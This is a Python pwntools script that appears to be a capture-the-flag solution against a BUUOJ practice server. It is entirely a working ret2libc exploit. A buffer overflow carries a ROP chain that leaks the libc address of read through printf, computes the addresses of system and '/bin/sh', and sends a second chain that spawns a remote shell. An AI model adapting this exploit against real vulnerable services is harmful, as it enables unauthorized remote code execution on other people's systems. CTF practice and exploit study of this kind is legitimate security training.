from pwn import *
from LibcSearcher import *
context.log_level='debug'

# io = process('./pwn')
io = remote('node4.buuoj.cn', 29802)
elf = ELF('./pwn')
libc = ELF('./libc.so.6')

poprdi_ret = 0x400733
poprsir15_ret = 0x400731

payload = cyclic(0x28)
payload += p64(poprdi_ret)
payload += p64(0x400790)
payload += p64(poprsir15_ret)
payload += p64(elf.got['read'])
payload += p64(0)
payload += p64(elf.plt['printf'])
payload += p64(elf.symbols['main'])

io.sendlineafter(b'What\'s your name? ', payload)
io.recvuntil(b'\n')
read = u64(io.recv(6) + b'\x00\x00')
base = read - libc.symbols['read']
system = base + libc.symbols['system']
binsh = base + next(libc.search(b'/bin/sh'))

print(hex(read))

payload = cyclic(0x28)
payload += p64(poprdi_ret)
payload += p64(binsh)
payload += p64(system)
payload += p64(elf.symbols['main'])

io.sendlineafter(b'What\'s your name? ', payload)

io.interactive()